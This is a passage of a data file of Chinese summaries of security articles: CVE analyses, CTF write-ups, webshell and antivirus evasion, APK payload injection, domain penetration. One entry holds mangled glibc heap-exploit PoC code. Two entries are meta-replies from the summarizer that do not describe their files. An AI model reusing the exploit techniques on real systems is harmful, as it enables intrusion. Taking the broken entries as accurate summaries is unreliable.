        "page_content": "这篇博文讨论了 TPM 2.0 参考实现代码中的两个漏洞，即越界写⼊ (CVE-2023-1017) 和越界读取 (CVE-2023-1018)，这些漏洞影响了多个软件和硬件 TPM 实现，包括虚拟化软件和云计算提供商。这些漏洞允许攻击者通过发送带有加密参数的恶意 TPM 2.0 命令来触发用户模式应用程序，从而可能导致虚拟机逃逸。",
        "FileName": "12443-TPM 2.0 参考实现代码中的漏洞.pdf"
    },
    {
        "page_content": "该文档分析了两个 CTF 比赛中的代码审计题目，重点关注了 PbootCMS 中的历史漏洞。第一个题目涉及利用 pearcmd.php 文件进行 RCE，而第二个题目涉及绕过 SearchController 类中的 get 函数过滤器。文档提供了详细的步骤，说明如何利用这些漏洞，并提供了相关链接以获取更多信息。",
        "FileName": "10565-记一次ctf中代码审计分析.pdf"
    },
    {
        "page_content": "该文档描述了一个绕过 Google 域检测的漏洞，该漏洞允许攻击者通过在恶意网站上嵌入 henhouse 应用程序来窃取受害者的 API 密钥或 OAuth 客户端 ID。该漏洞利用了 Google URL 解析器中一个正则表达式中的一个字符，该字符在被浏览器解析时结束权限，但在被正则表达式解析时不会失去权限。该漏洞影响了广泛的 Google 产品，包括 Google Cloud Console、YouTube Studio 和 Google 登录页面。该漏洞于 2020 年 1 月 4 日报告给 Google，并于 2020 年 3 月 6 日修复，赏金为 6000 美元。",
        "FileName": "7384-Bug Bounty绕过Google域检测.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Commons Collections 库中的 CC1 反序列化漏洞链，该漏洞链利用了 Transformer 接口的 transform 方法，通过一系列子类和方法调用，最终达到在目标系统上执行任意命令的目的。文档详细介绍了漏洞链的各个步骤，包括起点、终点和解决过程中遇到的问题。",
        "FileName": "12669-JAVA安全初探(三)CC1链全分析.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Webshell 免杀技术，包括日志检测、文件内容检测、文件行为检测、Webshell 工具特征检测和 PHP 木马静态免杀等方法，并提供了具体的绕过检测的示例代码。",
        "FileName": "9246-免杀一句话木马(PHP).pdf"
    },
    {
        "page_content": "好的，我注意到了。我将只输出文档的内容，而不包含文档的主题。",
        "FileName": "7228-Weblogic使用ClassLoader和RMI来回显命令执行结果.pdf"
    },
    {
        "page_content": "本文档介绍了 AWD 比赛的入门指南，涵盖了比赛题型、拓扑、流程、信息搜集、攻击技术、防御技术等方面，旨在帮助参赛者快速了解比赛规则和技术要点，提高比赛成绩。",
        "FileName": "10995-AWD比赛入门攻略总结.pdf"
    },
    {
        "page_content": "该文档分析了一个 Office 宏病毒样本，该样本使用 VBA 宏、PowerShell 脚本和 .NET 代码来绕过 AMSI 检测并下载和执行恶意文件。",
        "FileName": "9716-记一次Office宏样本分析.pdf"
    },
    {
        "page_content": "**主题：** CSZ CMS 1.2.7 中的 XSS 漏洞分析与复现\n\n**内容：** CSZ CMS 1.2.7 中存在一个 XSS 漏洞，允许未经授权的用户通过修改 User-Agent 值向管理面板注入 JavaScript 代码。该漏洞是由于在插入私人消息时未对 User-Agent 进行 XSS 过滤，导致攻击者可以将恶意代码存储在数据库中。当管理员登录后台时，该恶意代码会被触发，导致 XSS 攻击。",
        "FileName": "7730-CSZ CMS 1.2.7 xss分析与复现.pdf"
    },
    {
        "page_content": "该文档介绍了 520_APK_HOOK 项目，该项目允许将 Metasploit 生成的 payload 注入到正常的 APK 文件中，并重新打包后进行加固，以绕过移动安全管家的检测。该项目支持单 classes.dex 文件操作，并提供了一个 Python 脚本，用于生成注入的 APK 文件和处理签名和加固过程。该文档还提供了使用 Metasploit 控制台加载处理程序文件并启动服务端监听的说明，以便在安装注入的 APK 文件后对目标设备进行远程控制。",
        "FileName": "9588-520_APK_HOOK.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何复现和分析 Apache Dolphinscheduler 中的漏洞，该漏洞允许通过 Java 的 MySQL 客户端连接服务端，导致本地客户端被远程代码执行 (RCE)。漏洞利用涉及在 MySQL 数据库中创建恶意 payload，然后通过 Dolphinscheduler 的创建数据库功能触发反序列化，最终执行任意命令。文档提供了详细的复现步骤、环境搭建指南和漏洞分析，并参考了其他研究人员的发现。",
        "FileName": "8304-Dolphinscheduler漏洞复现与分析.pdf"
    },
    {
        "page_content": "Webkit cve-2018-4441 shiftCountWithArrayStorage 漏洞分析与复现，该漏洞是由于 JSArray::shiftCountWithArrayStorage 函数中 holesMustForwardToPrototype 返回 false，导致进入后续逻辑，最终导致 unshiftCountWithArrayStorage 函数中 memmove 操作越界，可以构造内存布局，修改其他 object 的 butterfly 长度，从而实现越界读写。",
        "FileName": "7694-Webkit cve-2018-4441 shiftCountWithArrayStorage 漏洞分析与复现.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用某医院管理系统中的变量覆盖漏洞来获取系统权限，并通过恶意代码注入和文件写入技术实现Getshell，最终获得对系统的控制权。",
        "FileName": "11276-实战——某医院管理系统Getshell.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 PHP 魔术方法和 XML 实体读取文件，通过构造反序列化链和 phar 协议，成功读取了 flag 文件的内容，最终获得了 flag 为 \"flag{this-is-flag-for-you}\"。",
        "FileName": "12385-2023长城杯Web WP.pdf"
    },
    {
        "page_content": "该文档介绍了进程伪装技术，通过修改进程的命令行参数和路径信息，使其伪装成系统必备进程，从而实现权限维持。该技术利用了 Windows 系统中 PEB 结构，通过修改 PEB 中 ProcessParameters 结构的 Buffer 和 Length 字段，实现了进程伪装。",
        "FileName": "10435-初探进程伪装.pdf"
    },
    {
        "page_content": "House of Rabbit 原理 Poc 漏洞利⽤ (UAF ， fastbins\tdup 等 ) \\n\t\t*fast\t=\t%p \\n\t\t , \t fake ); \\n\t\tfastbins\tlist\t:\t[%p,\t%p,\t%p] \\n\\n \" , \t fast - 0x10 , \t fake , \t * ( void \t ** )( fake + 0x10 )); \t\t\t\t printf ( \t \"\t\tFree\tfast\tchunk. \\n\\n \" ); \t\t\t\t free ( small ); \t\t\t\t printf ( \t \"\t\t 将 \tunsorted\tbins\t 链接到合适的链表 \\n \" \t\t\t\t\t\t\t\t \"\t\t 将 fake_chunk1\t 的 \tsize\t 重写为 \t0xa0001\t 来绕过 \t'size\t<\tav->system_mem'\t 检查 . \\n \" ); \t\t\t\t gbuf [ 3 ] \t = \t 0xa00001 ; \t\t\t\t malloc ( 0xa00000 ); \t\t\t\t printf ( \t \"\t\t 申请⼀个超⼤ \tchunk. \\n \" \t\t\t\t\t\t\t\t \"\t\t 现在 ,\tfake_chunk1\t 会链接到 \tlargebin[126](max). \\n \" \t\t\t\t\t\t\t\t \"\t\t 然后 ,\t 将 fake_chunk1\t 的 \tsize\t 改为 \t0xfffffffffffffff1. \\n\\n \" ); \t\t\t\t gbuf [ 3 ] \t = \t 0xfffffffffffffff1 ; \t\t\t \t\t\t\t printf ( \t \"\t\t 覆写 \t.data\t 段上的⽬标值 \\n \" \t\t\t\t\t\t\t\t \"\t\t ⽬标值位于 \t%p \\n \" \t\t\t\t\t\t\t\t \"\t\t 覆写之前是 \t:\t%s \\n \" \t\t\t\t\t\t\t\t , \t & target , \t target ); \t\t\t\t malloc (( void * ) & target - ( void * )( gbuf + 2 ) - 0x20 ); \t\t\t\t victim \t = \t malloc ( 0x10 ); \t\t\t\t printf ( \"\t\t 在 \t%p\t 申请 \t0x10\tbyte,\t 然后任意写⼊ . \\n \" , \t victim ); \t\t\t\t strcpy ( victim , \t \"Hacked!!\" ); \t\t\t\t printf ( \"\t\t 覆写之后是 \t\t:\t%s \\n \" , \t target ); } void \t evict_tcache ( size_t \t size ){ \t\t\t\t void \t * p ; #if\tdefined(GLIBC_VERSION)\t&&\t(GLIBC_VERSION\t>=\t26) \t\t\t\t p \t = \t malloc ( size ); #if\t(GLIBC_VERSION\t<\t29) \t\t\t\t free ( p ); \t\t\t\t free ( p ); \t\t\t\t malloc ( size ); \t\t\t\t malloc ( size ); \t\t\t\t * ( void ** ) p \t = \t NULL ; \t\t\t\t malloc ( size ); #else#if\t(GLIBC_VERSION\t==\t29) \t\t\t\t char \t * counts \t\t\t\t\t\t\t\t = \t ( char * )((( unsigned \t long ) p \t & \t ~ 0xfff ) \t + \t 0x10 ); #else \t\t\t\t uint16_t \t * counts \t\t\t\t = \t ( char * )((( unsigned \t long ) p \t & \t ~ 0xfff ) \t + \t 0x10 ); #endif \t\t\t\t counts [( size \t + \t 0x10 \t >> \t 4 ) \t - \t 2 ] \t = \t 0xff ; #endif #endif } p \t = \t malloc ( 0xa00000 ); \t\t\t\t free ( p ); \t\t\t\t p \t = \t malloc ( 0xa00000 ); \t\t\t\t free ( p ); 分步分析 1  malloc 两个堆块使 av->system_mem > 0xa00000pwndbg>\tvmmap LEGEND:\tSTACK\t | \tHEAP\t | \tCODE\t | \tDATA\t | \tRWX\t | \tRODATA \t\t\t\t\t\t\t\t\t\t0x400000\t\t\t\t\t\t\t\t\t\t\t0x402000\tr-xp\t\t\t\t\t 2000 \t 0 \t\t\t\t\t\t/home/kabeo/Desktop/house_of_rabbit \t\t\t\t\t\t\t\t\t\t0x601000\t\t\t\t\t\t\t\t\t\t\t0x602000\tr--p\t\t\t\t\t 1000 \t 1000 \t\t\t/home/kabeo/Desktop/house_of_rabbit \t\t\t\t\t\t\t\t\t\t0x602000\t\t\t\t\t\t\t\t\t\t\t0x603000\trw-p\t\t\t\t\t 1000 \t 2000 \t\t\t/home/kabeo/Desktop/house_of_rabbit \t\t\t\t\t\t\t\t\t\t0x603000\t\t\t\t\t\t\t\t\t\t0x1024000\trw-p\t\t\ta21000\t 0 \t\t\t\t\t\t [ heap ] \t\t< ===== \t 扩⼤到 0xa21000 \t\t\t\t0x7ffff7a0d000\t\t\t\t\t0x7ffff7bcd000\tr-xp\t\t\t1c0000\t 0 \t\t\t\t\t\t/lib/x86_64-linux-gnu/libc-2.23.so \t\t\t\t0x7ffff7bcd000\t\t\t\t\t0x7ffff7dcd000\t---p\t\t\t 200000",
        "FileName": "7267-House of 系列堆漏洞详解(二).pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2018-8120 漏洞，该漏洞是 Windows 7 和 Windows Server 2008 系列中一个经典的提权漏洞。文档详细介绍了漏洞成因、回溯分析、利用 POC 的构造和验证，以及利用任意地址写漏洞修改当前进程 Token 以提升权限的思路和方法。",
        "FileName": "8667-CVE-2018-8120分析与利用.pdf"
    },
    {
        "page_content": "本文档总结了 Node.js 中常见的漏洞，包括 eval() 函数导致的命令执行、原型链污染、lodash.merge 函数导致的原型链污染、node-serialize 模块的反序列化 RCE 漏洞、Node.js 目录穿越漏洞、vm 沙箱逃逸以及 JavaScript 中特殊字符的利用。",
        "FileName": "7184-Node.js 常见漏洞学习与总结.pdf"
    },
    {
        "page_content": "该文档分析了 ThinkPHP6.0 任意文件操作漏洞，该漏洞允许攻击者在目标环境启用 session 的条件下创建或删除任意文件，在特定情况下还可以 getshell。漏洞成因是 SessionId 不安全，导致攻击者可控的 SessionId 可以绕过安全检查，从而进行任意文件操作。",
        "FileName": "8409-代码审计之TP6任意文件操作漏洞.pdf"
    },
    {
        "page_content": "Cobalt Strike 的 Beacon 植入物可以通过配置可塑 C2 选项来规避内存中的 YARA 扫描，包括启用睡眠掩码、清理和混淆，以及使用自定义 UDRL。",
        "FileName": "12701-Cobalt Strike与YARA：我能拥有你的签名吗？.pdf"
    },
    {
        "page_content": "本文探讨了组策略和 GPP 在域渗透中的应用，重点关注密码存储和凭据保护的漏洞。它解释了 SYSVOL 共享文件夹的作用，以及如何利用 GPP 中存储的凭据来获取域内计算机的控制权。此外，本文还提供了利用 GPP 漏洞和后门进行横向移动的具体示例。",
        "FileName": "9511-浅谈域渗透中的组策略及gpp运用.pdf"
    },
    {
        "page_content": "Cobalt Strike 的 Aggressor Script（agscript）是一种基于 Raphael Mudge 的 Sleep 语言的脚本语言，用于控制 Cobalt Strike 3.0 及更高版本中的交互式脚本控制台。它允许用户跟踪、配置、调试和管理脚本，并提供菜单、对话框、文件操作、beacon 内外操作等功能。",
        "FileName": "11404-cs插件开发.pdf"
    },
    {
        "page_content": "该文档探讨了如何绕过 Linux 内核中的保护机制，包括 SMEP、KPTI 和 SMAP。通过使用 ROP 链和利用内核中的小工具，攻击者可以覆盖返回地址、修改 CR4 寄存器、执行交换页面表的操作，从而绕过这些保护并获得 root 权限。",
        "FileName": "9749-Linux Kernel Pwn Part 2.pdf"
    },
    {
        "page_content": "该文档介绍了如何修改冰蝎以适配基于 Tomcat Filter 的无文件 webshell，通过反编译冰蝎并修改其代码，可以实现通过 Filter 访问 Tomcat 内存马，从而执行命令、获取信息等操作。",
        "FileName": "7899-冰蝎改造之适配基于tomcat Filter的无文件webshell.pdf"
    },
    {
        "page_content": "RMI（Remote Method Invocation）是一种基于Java语言的远程方法调用技术，它允许客户端跨越JVM调用另一个JVM中的类方法。RMI攻击主要分为3种目标：RMI Client、RMI Server、RMI Registry。在JDK不同版本中，RMI攻击的源码分析也有所不同。在JDK 8u121之前，可以通过远程Reference字节码进行攻击，但从JDK 8u121开始，RMI加入了反序列化白名单机制，JRMPClient被列入白名单，这使得payload登上了舞台，绕过了反序列化白名单限制。从JDK 8u191开始，LDAP远程Reference代码默认不信任，需要通过javaSerializedData返回序列化gadget方式实现攻击。",
        "FileName": "7264-搞懂RMI、JRMP、JNDI-终结篇.pdf"
    },
    {
        "page_content": "该文档分析了智能合约中 BurnFrom 函数的设计缺陷，该缺陷允许被授权用户无限期地销毁授权用户的资产。该缺陷源于在销毁授权用户资产时未更新授权转账额度，导致被授权用户可以多次销毁授权用户的资产，直到其资产耗尽。",
        "FileName": "9984-智能合约审计之BurnFrom设计缺陷.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 JNDI 注入和 RMI 联合攻击，以及如何利用 Log4j2 漏洞。攻击者通过 JNDI 注入将恶意代码注入到目标服务器，然后通过 RMI 远程调用执行恶意代码。Log4j2 漏洞允许攻击者通过发送恶意日志消息来触发 JNDI 注入攻击。",
        "FileName": "12490-JNDI注入加RMI联合攻击并log4j2漏洞复现.pdf"
    },
    {
        "page_content": "好的，我理解了。以下是文档的主题和内容，以一段话的形式呈现：\n\n恶意程序初探是一篇关于恶意软件分析技术的文章。它介绍了恶意软件的常见类型、分析恶意软件的工具和技术，以及如何使用这些技术来检测和防御恶意软件。文章还提供了几个恶意软件分析的示例，以说明如何使用这些技术来识别和分析恶意软件。",
        "FileName": "9122-恶意程序初探.pdf"
    },
    {
        "page_content": "该文档记录了一次对学校澡堂预约系统的漏洞挖掘过程。研究人员通过分析预约流程，发现系统存在水平越权漏洞，可以修改其他用户的密码和邮箱。通过修改邮箱，攻击者可以重置目标用户的密码，从而控制其账号。该漏洞已提交给相关部门并已修复。",
        "FileName": "8256-对学校澡堂的漏洞挖掘.pdf"
    },
    {
        "page_content": "WordPress InfiniteWP Client 插件存在一个认证绕过漏洞，允许攻击者在知道管理员用户名的情况下，绕过认证直接登录后台。该漏洞源于插件在解析请求时，对某些特定操作（如添加站点）的请求不进行认证，导致攻击者可以通过发送包含特定参数的请求来触发漏洞，并通过响应中返回的 cookie 直接访问后台。",
        "FileName": "7115-Wordpress InfiniteWP Client插件认证绕过漏洞.pdf"
    },
    {
        "page_content": "该文档分析了 Apache OFBiz 中 CVE-2021-29200 漏洞的修复补丁，该补丁旨在解决通过 RemoteObjectInvocationHandler 作为 JRMPClient 进行利用的问题。然而，该补丁存在缺陷，可以通过使用 java.rmi.server.UnicastRef 或 javax.management.remote.rmi.RMIConnectionImpl_Stub 绕过白名单检测，从而仍然可以进行利用。",
        "FileName": "9556-Apache OFBiz CVE-2021-29200 简要分析.pdf"
    },
    {
        "page_content": "该文档重点介绍了 Docker 逃逸技术，包括判断 Docker 容器环境、利用危险配置、Docker Remote API 未授权访问、Docker 高危启动参数、挂载目录、Docker Socket、procfs 挂载等方法，并提供了漏洞复现步骤和参考资料。",
        "FileName": "8558-渗透测试之Docker逃逸.pdf"
    },
    {
        "page_content": "本文记录了一次失败的实战渗透经历，作者通过SQL注入漏洞获取了网站shell，并通过目录遍历和未授权上传找到了文件上传点，最终成功拿下了shell。随后，作者进行了初步信息搜集，并尝试通过MS17-010漏洞进行横向渗透，但由于目标机器上安装了杀软，导致渗透失败。作者还提供了域环境渗透的大致思路，强调了明确目标和灵活多变的重要性。",
        "FileName": "8586-记一次失败的实战渗透.pdf"
    },
    {
        "page_content": "该文档主要分析了 YXcms 代码审计的第二个漏洞，该漏洞存在于前台 XSS、任意文件删除和 SQL 注入中。文档详细分析了漏洞的成因和利用方法，并提供了相应的修复建议。",
        "FileName": "11008-代码审计第二弹--YXcms.pdf"
    },
    {
        "page_content": "该文档概述了 SQL 安全系列的第一个网络安全课程，涵盖了 MySQL 数据库的主题和内容，包括数据库创建、查询数据库、创建表、插入数据、修改数据、删除数据、删除表、删除数据库、php 连接 mysql、information_schema 数据库讲解、联合查询、联合注入、报错注入、布尔盲注、时间盲注、post 注入、联合注入 exp 编写、报错注入 exp 编写、布尔盲注 exp 编写、sql 注入 bypass waf、sql 注入代码审计。",
        "FileName": "12576-web安全系列一.pdf"
    },
    {
        "page_content": "该文档介绍了 SSP（安全支持提供程序）和 SSPI（安全支持提供程序接口）在 Windows 操作系统中的作用，以及如何利用它们进行权限维持和安全防护。文档详细描述了使用 mimikatz 工具将伪造的 SSP 注入内存和修改注册表以实现持久化的过程。此外，还提供了安全防御措施，例如检查注册表和使用 Autoruns 工具检测可疑 DLL。",
        "FileName": "7432-AD域SSP权限维持与安全防护.pdf"
    },
    {
        "page_content": "该文档探讨了智能合约中的重入漏洞，重点关注单函数、跨函数和跨合约重入攻击。它解释了这些攻击的原理，并强调了账户状态更新在转账操作之前进行的重要性。文档还提供了防御措施，例如使用函数修饰器和采用 pull-payment 模式。",
        "FileName": "12564-智能合约重入漏洞攻击与防御.pdf"
    },
    {
        "page_content": "本文探讨了短信验证码漏洞，包括无限制短信轰炸、有验证码的短信轰炸、特殊字符填充、短信发送间隔太短、IP限制绕过、验证码可置为空、验证码可枚举、手机号码可篡改、自定义验证码内容和验证码客户端绕过等类型，并提供了通用的解决方法，如在服务器端验证、限制发送周期、封禁恶意手机号码、使用更复杂的验证码格式和禁止用户自定义短信内容。",
        "FileName": "7926-浅谈短信验证码漏洞.pdf"
    },
    {
        "page_content": "该文档记录了作者对一个域渗透的详细过程，包括利用 JBoss 反序列化漏洞获取 Webshell、抓取密码、配置代理、使用各种工具批量扫描和攻击目标机器，以及最终成功渗透域内多台机器。",
        "FileName": "8398-阿鑫的一次域渗透.pdf"
    },
    {
        "page_content": "**主题：** 某杀猪盘渗透测试\n\n**内容：** 该文档详细描述了对一个杀猪盘网站的渗透测试过程，包括利用 ThinkPHP 5.0.5 RCE 漏洞写入 Webshell、绕过管理员 cookie 登录后台、利用宝塔面板漏洞获取服务器控制权，以及最终上线木马。",
        "FileName": "8224-某杀猪盘渗透测试.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Ofbiz 中的两个 CVE 漏洞（CVE-2021-26295 和 CVE-2020-9496），并提供了利用这些漏洞进行回显的详细步骤，包括环境搭建、回显 payload 的构造、漏洞利用工具的集成和使用。",
        "FileName": "9827-炒冷饭系列之第二篇--Apache Ofbiz回显利用与工具实现.pdf"
    },
    {
        "page_content": "本文深入分析了 Java 代码审计中的 XXE 漏洞，详细介绍了 XXE 的原理、漏洞成因、修复建议和代码审计技巧，并提供了丰富的案例和参考链接，帮助读者全面理解和防御 XXE 漏洞。",
        "FileName": "7272-一篇文章读懂Java代码审计之XXE.pdf"
    },
    {
        "page_content": "该文档记录了一次对某源码的审计过程，发现了两个漏洞：一个 SQL 注入漏洞和一个任意文件修改漏洞。SQL 注入漏洞是由于 arr2sql() 函数只对数组中的值进行转义过滤，而没有对相应的键进行转义过滤。任意文件修改漏洞是由于 FW() 函数直接使用 file_put_contents() 函数将数据写入文件中，而没有对数据进行过滤。",
        "FileName": "8395-记一次某源码审计.pdf"
    },
    {
        "page_content": "该文档讨论了通过参数污染触发跨站点脚本 (XSS) 攻击的技术。它描述了如何通过添加额外的回调参数来污染 HTTP 参数，从而绕过验证检查并注入恶意脚本。该技术允许攻击者在目标网站上执行任意代码，从而导致数据泄露、会话劫持或其他恶意活动。",
        "FileName": "9560-通过参数污染触发XSS.pdf"
    },
    {
        "page_content": "该文档详细描述了作者通过拿下旁站创建帝国 cms 后台账户，利用各种漏洞和技术，最终成功渗透目标网站并获取 shell 的过程。文档涵盖了渗透的各个阶段，包括信息收集、漏洞利用、提权和后渗透，为读者提供了深入了解网络安全攻击和防御的宝贵见解。",
        "FileName": "11356-通过拿下旁站创建帝国cms后台账户.pdf"
    },
    {
        "page_content": "WatchAD 是一款开源域安全入侵感知系统，它通过收集域控事件日志和 Kerberos 流量，利用特征匹配、协议分析等方式检测各种已知和未知威胁，覆盖了常见的内网域渗透手法。该文档详细介绍了 WatchAD 的安装部署、客户端配置、引擎初始化、前端部署以及攻防实战测试，并与微软 ATA 进行了对比。",
        "FileName": "10346-WatchAD攻防实战.pdf"
    },
    {
        "page_content": "本文档分析了利用 CVE-2020-2883 和 Shiro rememberMe 反序列化漏洞在 WebLogic 中注入蚁剑 shell 的方法。该方法涉及构造正确的 Object 对象、利用 CVE-2020-2883 和 CVE-2020-2555 加载字节码、实现 WebLogic 内存 shell、加载字节码到 Filter 类型的蚁剑 shell 等步骤。",
        "FileName": "8202-使用WebLogic CVE-2020-2883配合Shiro rememberMe反序列化一键注入蚁剑shell.pdf"
    },
    {
        "page_content": "该文档主要讨论了 xyhcms(thinkphp3.2.3) 反序列化漏洞，该漏洞源于配置信息以序列化形式存储在配置文件中，且为 php 后缀，攻击者可以通过插入配置文件 getshell，即使认真过滤了 php 标签，也可能产生 xss 和信息泄露的问题。利用该漏洞需要满足以下条件：php5.x 版本、site.php 泄露 CFG_COOKIE_ENCODE、制作 POC 获得反序列化 payload、开放会员注册、访问 php 文件获取绝对路径、通过恶意 mysql 服务器读取配置文件获取数据库信息、操作数据库、最终 getshell。",
        "FileName": "9256-痛失CVE之xyhcms(thinkphp3.2.3)反序列化.pdf"
    },
    {
        "page_content": "本文介绍了 CodeQL，一个开源的代码分析平台，并记录了使用它分析 Android 系统源码（AOSP）的过程。CodeQL 通过介⼊编译过程或进行静态程序分析来获取程序代码的语义信息，并生成数据库，然后使用专⽤语言编写查询语句来发现漏洞⻛险。本文详细介绍了使用 CodeQL 分析 AOSP 的步骤，包括解决编译过程中遇到的问题，如找不到命令、没有发现代码和文件系统只读等。",
        "FileName": "11080-使用 CodeQL 分析 AOSP.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Flask 框架中的 SSTI 注入，包括其原理、漏洞形成原因、利用方法以及实战题解题思路。文档详细介绍了 Flask 框架的渲染方法、模板结构、魔法方法和内置属性，并提供了多种绕过过滤的脚本和 payload。",
        "FileName": "12181-flask的SSTI注入.pdf"
    },
    {
        "page_content": "TikTok 招聘网站存在一个账号接管漏洞，该漏洞允许恶意攻击者利用 CSRF 和重定向漏洞接管用户账户。该漏洞仅限于招聘网站，不会影响 TikTok 的其他网站或移动应用程序。TikTok 已在 12 天内修复了该漏洞，并建议实施 CSRF 保护和适当的白名单验证来防止此类漏洞。",
        "FileName": "8677-TikTok招聘网站的账号接管漏洞.pdf"
    },
    {
        "page_content": "该文档主要讨论了如何绕过 PHP 中的 open_basedir 限制，该限制通常用于限制用户访问特定目录和文件。文档介绍了多种绕过技术，包括命令执行、realpath() 函数、bindtextdomain() 函数、SplFileInfo::getRealPath() 方法、glob:// 伪协议、DirectoryIterator 类、readdir() 函数、ini_set() 函数以及利用 ini_set() 绕过 ini_set() 本身。",
        "FileName": "10893-你的open_basedir安全吗？.pdf"
    },
    {
        "page_content": "Groovy 是一种基于 JVM 的面向对象编程语言，它可以与 Java 很好地结合使用，并提供更灵活和简洁的语法。Groovy 允许直接执行 Java 代码，支持单引号闭合字符串，并提供各种方法来加载和执行远程或本地 Groovy 脚本，从而实现命令执行。",
        "FileName": "10703-Java安全-Groovy.pdf"
    },
    {
        "page_content": "本文探讨了利用 LDAP 反序列化漏洞进行远程代码执行 (RCE) 的方法。该漏洞存在于 Springboot 2.5.13 和 JDK8u111 中，允许攻击者通过 LDAP 服务提供恶意序列化数据来触发反序列化，从而在目标系统上执行任意代码。",
        "FileName": "12835-关于LDAP反序列化的利用浅析.pdf"
    },
    {
        "page_content": "XSS（跨站脚本攻击）是一种前端漏洞，攻击者在网页中嵌入恶意代码，利用 JavaScript 编写的恶意代码来执行一些想要的功能，从而窃取管理员的会话和 cookie 信息，配合其他漏洞，如与网页木马结合，扔到那里去跳转到网页木马地址，网页木马地址被执行后续就控制一些权限。XSS 漏洞的产生主要是由于输出问题导致的 JavaScript 代码被识别执行，可以通过手工测试、工具扫描测试、XSS 漏洞绕过等方法发现和利用。",
        "FileName": "9424-浅谈XSS.pdf"
    },
    {
        "page_content": "该文档详细介绍了渗透测试人员在遇到远程控制软件时如何利用其弱点进行深入渗透。通过上传恶意war包，渗透人员获得了对目标系统的shell访问权限。随后，他们利用远程控制软件To*的临时密码功能，窃取了受害机的明文密码。此外，他们还通过分析软件2的配置信息，获取了设备识别码和验证码，成功连接了远程桌面。该文档强调了在渗透测试中利用简单方法的重要性，并提供了具体步骤和工具链接，以帮助渗透人员有效地利用远程控制软件的弱点。",
        "FileName": "12532-记一次渗透测试遇到远程控制软件的深入利用.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Windows pwn 学习笔记，包括安装 winpwn、栈溢出相关结构体、触发异常源码、GS Cookies 验证代码、异常触发函数、伪造 scopeTable、劫持 filterFunc、payload 以及堆溢出相关结构体例题。",
        "FileName": "8531-Windows pwn学习笔记.pdf"
    },
    {
        "page_content": "该文档主要介绍了如何利用 HEVD 中的内核驱动程序漏洞，并编写针对 ring 0 的利用程序。作者详细介绍了如何安装 HEVD、搭建实验环境、分析 shellcode、创建利用代码，以及在受害者机器上进行内核调试。通过逐步分析和调试，作者成功利用了该漏洞，并在受害者机器上获得了 SYSTEM 权限，并生成了一个 cmd shell。",
        "FileName": "7913-HEVD内核漏洞 — Windows 7 x86 栈溢出.pdf"
    },
    {
        "page_content": "本文探讨了利用 Linux shell 脚本变量构造无字母数字命令的方法，介绍了使用 $0、$#、$? 和 $(()) 等变量来构造命令，并提供了利用这些变量构造无字母数字命令的示例 payload。这些技巧可以绕过禁止字母和数字的限制，在渗透测试和 CTF 挑战中发挥作用。",
        "FileName": "12242-利用shell脚本变量构造无字母数字命令.pdf"
    },
    {
        "page_content": "文档探讨了格式化字符串漏洞的原理和利用技巧，包括如何获取指定参数对应栈的内存值、任意地址内存、覆盖内存等，并提供了脚本和函数来简化利用过程。",
        "FileName": "7398-格式化字符串漏洞小总结（上）.pdf"
    },
    {
        "page_content": "本文档对 ThinkPHP 5.0.X 框架进行了代码审计，重点关注了 POP 链和 RCE 漏洞。通过使用 Seay 源代码审计系统和 PHPSTORM 的 Xdebug，作者分析了框架的目录结构、控制器文件、反序列化函数、__destruct() 函数和 __call() 魔术方法。最终，作者利用了 File.php 中的 file_put_contents() 函数和 Memcache.php 中的 write 函数，通过构造一个精心设计的 EXP，成功在目标系统上写入了 webshell。",
        "FileName": "11658-ThinkPHP 5.0.X代码审计.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何绕过杀毒软件，通过默认密码登录目标网站，并使用各种技术（如查找绝对路径、反弹 shell、抓取密码）来获取对目标机器的控制权。文档还强调了在执行此类攻击时免杀和谨慎的重要性。",
        "FileName": "9856-绕过杀软拿下目标站.pdf"
    },
    {
        "page_content": "本文从红队视角阐述了渗透测试的思想和技术，强调了隐蔽和持久化的重要性。通过一个红蓝对抗实战演练平台的渗透案例，介绍了信息收集、漏洞利用、权限维持和横向移动等渗透技术，并分享了红队攻防中的经验和技巧，强调了基础建设、匿名性和痕迹清理的重要性。",
        "FileName": "10258-红队实战攻防技术（一）.pdf"
    },
    {
        "page_content": "**主题：** CVE-2022-1292 分析\n\n**内容：** CVE-2022-1292 是 OpenSSL 中 c_rehash 命令注入漏洞，允许攻击者以 c_rehash 脚本的权限执行命令。该漏洞源于 c_rehash 函数在处理目录中的文件时未正确验证文件名，导致攻击者可以通过创建包含特殊字符的文件名来绕过检查并执行任意命令。",
        "FileName": "11703-CVE-2022-1292的分析.pdf"
    },
    {
        "page_content": "该文档分析了因酷开源网校系统中视频上传功能模块的漏洞，该漏洞允许攻击者通过绕过文件类型限制上传恶意文件，从而导致网站被攻击。漏洞复现步骤包括构造一个上传表单，将文件类型参数设置为 jsp，然后上传恶意文件。",
        "FileName": "8593-JAVA代码审计之因酷开源网校系统文件上传漏洞分析.pdf"
    },
    {
        "page_content": "该文档介绍了一种基于自然语言处理 (NLP) 的威胁检测引擎，该引擎通过将汇编代码向量化并将其视为单词，然后使用 TF-IDF 和 XGBoost 进行分类，来识别恶意软件。该引擎通过语句切割技术提取具有实际意义的代码块，从而克服了直接输入汇编代码的局限性。尽管该引擎在小样本数据集上表现出令人印象深刻的准确性，但它需要大量样本和丰富的词库才能进一步优化其性能。",
        "FileName": "11046-基于NLP的威胁检出引擎.pdf"
    },
    {
        "page_content": "该文档分析了 Weblogic Coherence 组件中的 CVE-2020-2555 漏洞，该漏洞允许攻击者通过构造 T3 协议请求在未授权的情况下获取 Weblogic 服务器权限并执行任意命令。文档详细介绍了漏洞的触发机制，包括链式调用、触发调用链和构造 POC 的步骤，并提供了临时解决方案和补丁安装建议。",
        "FileName": "10199-Weblogic Coherence组件漏洞初探CVE-2020-2555.pdf"
    },
    {
